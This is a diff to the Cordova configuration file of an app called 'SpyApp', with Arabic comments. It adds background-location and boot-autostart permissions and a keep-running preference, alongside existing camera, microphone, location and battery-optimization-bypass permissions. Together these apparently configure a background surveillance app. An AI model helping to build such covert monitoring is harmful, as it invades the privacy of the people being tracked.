@@ -3,11 +3,16 @@
     xmlns="http://www.w3.org/ns/widgets"
     xmlns:cdv="http://cordova.apache.org/ns/1.0">
 
+    <!-- اسم التطبيق -->
     <name>SpyApp</name>
+    <description>تطبيق مراقبة الأوامر وتشغيل الخدمات في الخلفية</description>
+    <author email="support@spyapp.com" href="https://spyapp.com">SpyApp Team</author>
+
+    <!-- الصفحة الرئيسية للتطبيق -->
     <content src="index.html" />
     <access origin="*" />
 
-    <!-- السماح بجميع الروابط والطلبات -->
+    <!-- السماح بالوصول إلى جميع البروتوكولات -->
     <allow-intent href="http://*/*" />
     <allow-intent href="https://*/*" />
     <allow-intent href="tel:*" />
@@ -22,6 +27,12 @@
     <preference name="ShowTitle" value="true" />
     <preference name="LoadUrlTimeoutValue" value="700000" />
     <preference name="AutoHideSplashScreen" value="true" />
+    <preference name="SplashScreenDelay" value="3000" />
+    <preference name="KeepRunning" value="true" />
+    <preference name="AllowInlineMediaPlayback" value="true" />
+    <preference name="DisallowOverscroll" value="true" />
+    <preference name="StatusBarOverlaysWebView" value="true" />
+    <preference name="StatusBarBackgroundColor" value="#000000" />
 
     <!-- الإضافات (Plugins) -->
     <plugin name="cordova-plugin-camera" />
@@ -49,6 +60,7 @@
                 <!-- الموقع -->
                 <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
                 <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+                <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
 
                 <!-- الكاميرا والمايك -->
                 <uses-permission android:name="android.permission.CAMERA" />
@@ -73,6 +85,8 @@
                 <!-- إذن تجاهل تحسينات البطارية -->
                 <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
 
+                <!-- إذن التشغيل التلقائي عند إعادة التشغيل -->
+                <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
             </manifest>
         </edit-config>
     </platform>
